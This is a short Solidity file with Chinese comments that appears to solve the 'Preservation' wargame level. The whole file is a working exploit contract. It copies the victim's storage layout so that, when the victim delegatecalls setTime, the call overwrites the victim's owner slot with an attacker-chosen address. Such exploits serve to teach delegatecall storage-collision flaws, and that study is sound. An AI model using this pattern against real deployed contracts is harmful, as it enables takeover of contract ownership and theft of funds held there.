// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackPreservation {
    // 必須與 Preservation 的 Slot 佈局完全一致
    address public timeZone1Library; // Slot 0
    address public timeZone2Library; // Slot 1
    address public owner;            // Slot 2
    uint256 public storedTime;       // Slot 3

    // 函數簽署必須完全一致: setTime(uint256)
    function setTime(uint256 _newOwner) public {
        // 當 Preservation 執行 delegatecall 到這裡時
        // 修改這裡的 owner 實際上是修改 Preservation 的 Slot 2
        owner = address(uint160(_newOwner));
    }
}
